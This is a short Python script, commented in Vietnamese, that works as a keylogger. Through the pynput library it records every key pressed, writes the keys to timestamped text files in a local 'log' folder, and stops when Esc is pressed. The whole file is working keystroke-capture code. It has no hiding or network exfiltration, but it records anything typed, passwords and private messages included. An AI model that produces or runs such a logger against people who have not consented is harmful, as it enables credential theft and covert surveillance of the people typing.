#import các thư viện cần thiết
import time
import os
from pynput import keyboard
# khai báo biến ở đây
log_folder = 'log'
key_exit = "Key.esc"

# hàm kiểm tra key có phải có các phím đặc biệt hay không.
def is_special_key(key):
    special_keys = ["Key.shift_r", "Key.shift", "Key.alt_l", "Key.alt_gr", "Key.ctrl_r", "Key.ctrl_l", "Key.tab"]
    return key in special_keys

#hàm tạo folder log nếu folder chưa tôn tại
def create_log_folder():
    if not os.path.exists(log_folder):
        os.makedirs(log_folder)

#hàm tạo name cho file log, ở đây sẽ tạo filename tương ứng với ngày giờ mà chương trình được thực thi
def create_log_filename():
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    return f'{log_folder}/{timestamp}.txt'

#hàm record_keypress() để lưu các key được nhấn vào file log 
def record_keypress(key, log_filename):
    #convert key sang str để so sánh
    key = str(key);
    #trong hệ thông thì ký tự được lưu dưới dạng "'"key"'"" nên phải thay thế "'" trở thành "key" trước khi ghi file
    key = key.replace("'", "")
    #trong trường hợp muốn thoát chương trình thì ấn "Esc"
    if key == key_exit:
        raise SystemExit(0);
    #kiểm tra nếu là ký tự đặc biệt thì thay thế bằng chuỗi rỗng
    if is_special_key(key):
        key = "";
    #kiểm tra nếu là keypress là "Key.space" thì thay thế bằng khoảng trắng rồi mới ghi file
    if key == "Key.space":
        key = " ";
    #kiểm tra nếu phím nhập vào là "Key.enter" thì thực hiện xuống dòng
    if key == "Key.enter":
        key = "\n";
    #thực hiện mở file và ghi nội dung của key vào file
    with open(log_filename, 'a') as log_file:
        log_file.write(key)

if __name__ == "__main__":
    create_log_folder()
    log_filename = create_log_filename()

    def on_press(key):
        record_keypress(key, log_filename)
    # thực hiện ghi file khi chương trình được chạy và dừng khi lại khi chương trình kết thúc
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

